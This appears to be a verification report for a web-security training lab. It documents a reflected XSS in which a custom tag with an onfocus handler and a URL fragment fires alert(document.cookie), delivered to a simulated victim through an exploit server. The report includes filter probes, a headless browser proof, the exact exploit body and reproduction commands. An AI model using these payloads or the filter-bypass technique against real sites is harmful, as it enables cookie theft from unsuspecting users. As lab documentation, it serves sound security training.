# Verification — Custom-tag focus XSS with victim delivery

## Methodology
1. Reflection mapping (curl): unique marker → single echo (`<h1>`, verbatim?).
2. Filter-shape probe FIRST: `<xss autofocus onfocus=PROBE1>` (custom tag + handler
   in one request) — 200 + verbatim echo immediately characterizes this WAF as
   tag-only (vs prior lab's tag+handler filtering).
3. Official objective retrieval (lab page): victim `alert(document.cookie)`.
4. Headless focus-chain proof with title marker (no victim needed).
5. Exploit-server STORE (byte-verify) → DELIVER → access-log + banner polls.
6. Self-fire control: own-browser alert must NOT solve (platform rule check).

## Evidence

### 1. Reflection + filter gap (curl, two requests)
```
?search=reconprobe               → <h1>0 search results for 'reconprobe'</h1>
?search=<xss autofocus onfocus=PROBE1>
                                 → 200 + <h1>0 search results for '<xss autofocus onfocus=PROBE1>'</h1>
```
Custom tag with event handler passes unmodified — filter shape identified as
standard-tags-only (contrast prior lab, where the same shape 400s on `onfocus`).

### 2. Focus-chain proof (headless dump-dom, virtual-time settle)
```
?search=%3Cxss+id%3Dx+onfocus%3Ddocument.title%3D%27FOCUSMK%27+tabindex%3D1%3E#x
→ <title>FOCUSMK</title>
→ rendered: <xss id="x" onfocus="document.title='FOCUSMK'" tabindex="1" …>
```
Initial navigation WITH fragment auto-focuses the focusable custom element;
`onfocus` fires during load; zero interaction. (Fragment-focus is load-intrinsic —
no iframe/second navigation needed, unlike resize/hashchange triggers.)

### 3. Delivery evidence
- STORE → 200; `GET /exploit` byte-verified (xxd spot-checked prefix).
- DELIVER ×2 → 302s; victim latency several minutes (slower than prior lab).
- Access log: `GET /exploit/ "Mozilla/5.0 (Victim)…Chrome/151.0.0.0…"` — victim visit.
- Self-fire control: own-browser tab loaded the payload URL (alert presumably fired
  locally) → banner stayed `is-notsolved` — victim signal REQUIRED, confirmed.
- Banner after victim visit: `is-solved` (log page itself also showed solved status).

### 4. Stored exploit body (exact)
```html
<script> location = 'https://0a5e00df041bb628818d116d00b300c7.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex=1%3E#x'; </script>
```

### 5. Dead-end / classification analysis
| Candidate | Verdict | Basis |
|---|---|---|
| Standard tags (`<img>`, `<svg>`, …) | blocked (title premise) | same 400 family as prior lab; custom-tag finding made mapping unnecessary |
| Handler filtering assumption (from prior lab) | WRONG here — disproven in 1 probe | `onfocus` passes; each build's filter shape must be re-mapped, never ported |
| `autofocus` variant (`<xss autofocus onfocus=…>`) | PLAUSIBLE, unfired | same sink, equivalent trigger; fragment form chosen (single-artifact URL) |
| Self-browser alert as solve | does NOT solve (verified) | platform gates on victim signal |
| Click/hover-gated shapes | unnecessary | fragment focus is load-intrinsic |

## Reproducibility
```
BASE=…; q() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote_plus(sys.argv[1]))" "$1"; }
curl -s "$BASE/?search=$(q '<xss autofocus onfocus=PROBE1>')" | grep -o "search results for '.*"
chromium --headless --no-sandbox --dump-dom "$BASE/?search=$(q "<xss id=x onfocus=document.title='M' tabindex=1>")#x" | grep -o "<title>[^<]*</title>"
# exploit server: STORE full body → GET /exploit byte-check → DELIVER → GET /log (victim UA) → banner
```

## Confirmation criteria
- CONFIRMED: verbatim custom-tag echo, headless fragment-focus execution,
  byte-exact stored exploit, victim visit, `is-solved`, self-fire insufficiency.
- Filter-shape difference from the sibling lab recorded as a first-class finding
  (re-map per build).